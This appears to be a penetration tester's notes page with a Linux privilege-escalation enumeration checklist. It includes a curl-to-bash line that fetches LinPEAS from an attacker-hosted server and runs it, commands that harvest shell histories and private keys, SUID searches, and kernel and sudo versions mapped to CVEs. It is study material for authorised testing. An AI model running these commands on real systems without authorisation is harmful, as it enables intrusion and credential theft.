## Linpeas

script to find interesting stuffs on linux, potentially privilege escalation

```sh
## Download script
wget https://github.com/peass-ng/PEASS-ng/releases/download/20250301-c97fb02a/linpeas.sh
## Host http
python -m http.server 8080
## execute on remote
curl http://<local-ip>:8080/linpeas | bash
```

---
## Basic
- `id`?
	- `adm` group? [adm]({{< relref "6. Privilege Escalation/Linux/Privileged groups/adm" >}})
	- `docker` group? [Docker group]({{< relref "6. Privilege Escalation/Linux/Privileged groups/Docker#docker-group" >}})
	- `lxd` group? [LXC]({{< relref "6. Privilege Escalation/Linux/Privileged groups/LXC" >}})
```sh
id
```
- Other non-standard group?
```sh
find / -type f -group <group_name>
```
- Shell history
```sh
history
```
```sh
cat ~/.bash_history
cat ~/.zsh_history
```
```sh
find / -type f \( -name *_hist -o -name *_history \) -ls 2>/dev/null
```
- OS version
```sh
cat /etc/os-release
```
- Kernel version
	- `3.8.6`, `3.11.0`, `3.15.0`, `3.18.0`? [Logrotate]({{< relref "6. Privilege Escalation/Linux/CVE/Logrotate" >}})
	- `5.8` to `5.17`? [Dirty Pipe]({{< relref "6. Privilege Escalation/Linux/CVE/Dirty Pipe" >}})
	- `2.6` - `5.11`? [CVE-2021-22555]({{< relref "6. Privilege Escalation/Linux/CVE/Netfilter#cve-2021-22555" >}})
	- `5.4` to `5.6.10`? [CVE-2022-25636]({{< relref "6. Privilege Escalation/Linux/CVE/Netfilter#cve-2022-25636" >}})
	- Below `6.3.1`? [CVE-2023-32233]({{< relref "6. Privilege Escalation/Linux/CVE/Netfilter#cve-2023-32233" >}})
```sh
uname -r
```
```sh
cat /proc/version
```
- Sudo version
	- `1.8.31`, `1.8.27`, `1.9.2`? [CVE-2021-3156]({{< relref "6. Privilege Escalation/Linux/CVE/Sudo CVE#cve-2021-3156" >}})
	- Below `1.8.28`? [CVE-2019-14287]({{< relref "6. Privilege Escalation/Linux/CVE/Sudo CVE#cve-2019-14287" >}})
```sh
sudo -V
```
- List user's sudo privilege
    - No `env_reset` option? `env_keep` enabled? `SETENV` allowed? [Sudo environment variables]({{< relref "6. Privilege Escalation/Linux/Sudo#environment-variables" >}})
    - If not, go to [GTFOBins](https://gtfobins.github.io/) for commands with sudo that we can play with
```sh
sudo -l
```
- Installed packages
```sh
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```
```sh
ls /bin
```
- SSH keys
```sh
ls -l ~/.ssh
```
- All readable keys
```sh
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```
- `/etc/passwd` might contain hash, but very rare
```sh
cat /etc/passwd
```
- Find high-privileged binaries. See [Path Injection]({{< relref "6. Privilege Escalation/Linux/Path Injection" >}}) and [Python library hijack]({{< relref "6. Privilege Escalation/Linux/Python library hijack" >}})
```sh
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
getcap -r / 2>/dev/null
```
- Who can use shell (who to target)
```sh
grep 'sh$' /etc/passwd | awk -F: '{print $1}'
```
- Who can use sudo?
```sh
getent group sudo
```
- Find all writeable directories
```sh
find / -writable -type d 2>/dev/null | grep -v '/home/<user>'
```
- Environment variables
```sh
env
```
- List all temp dir
```sh
ls -l /tmp /var/tmp /dev/shm
```
- I don't even know what it does, black magic
```sh
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```
- Ports
```sh
ss -tunl
netstat -tunl
```

---
## Processes

### Processes run by root

```sh
ps aux | grep root
```

### Running processes

```sh
ps au
```

### `pspy`

[Github Page](https://github.com/DominicBreuker/pspy)

To monitor processes without root.

Download the binary, transfer it to target machine

```sh
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

Then just run it

```sh
./pspy64 -pf -i 1000
```

---
## Crontab

```sh
cat /etc/crontab
```

```sh
ls -la /etc/cron.daily/
```

```sh
crontab -l
```

---
## Disks

```sh
lsblk
```

```sh
cat /etc/fstab
```

---
## Logged in users

```sh
lastlog
```

Yea, just `w`

```sh
w
```